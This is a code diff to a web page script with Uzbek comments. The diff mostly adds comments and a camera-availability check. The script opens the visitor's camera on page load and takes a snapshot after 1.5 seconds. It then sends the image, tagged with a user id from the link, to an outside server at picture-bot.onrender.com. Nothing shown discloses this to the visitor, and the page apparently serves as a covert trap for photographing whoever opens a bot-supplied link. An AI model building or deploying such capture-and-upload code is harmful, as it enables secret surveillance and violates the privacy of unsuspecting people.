@@ -54,16 +54,23 @@
         // Kamera ishga tushirish
         async function startCamera() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // Kamerani qo'llab-quvvatlashni tekshirish
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    throw new Error("Kamerani qo'llab-quvvatlamaydi!");
+                }
+
+                // Kamerani ochish
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
 
-                // Kamera ochilishini kutish (rezolutsiya yuklanishi kerak)
+                // Kamera ochilishini kutish
                 await new Promise(resolve => video.onloadedmetadata = resolve);
 
+                // Rasm olish
                 setTimeout(captureImage, 1500); // 1.5 soniyada rasm olish
             } catch (err) {
                 console.error("Kameraga ruxsat berilmadi!", err);
-                errorMessage.innerText = "❌ Kameraga ruxsat berilmadi!";
+                errorMessage.innerText = "❌ Kameraga ruxsat berilmadi yoki kamera mavjud emas!";
                 errorMessage.classList.remove("hidden");
                 retryButton.classList.remove("hidden");
             }
@@ -79,14 +86,19 @@
                 return;
             }
 
+            // Canvas o'lchamlarini kamera o'lchamlariga moslashtirish
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Rasmni base64 formatiga o'tkazish
             const imageData = canvas.toDataURL("image/png");
             const userId = getQueryParam("id");
 
+            // Xabarni ko'rsatish
             message.classList.remove("hidden");
 
+            // Serverga rasmni yuborish
             fetch("https://picture-bot.onrender.com/upload", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -119,6 +131,7 @@
             location.reload();
         });
 
+        // Dastur ishga tushganda kamera ochish
         startCamera();
     </script>
 </body>
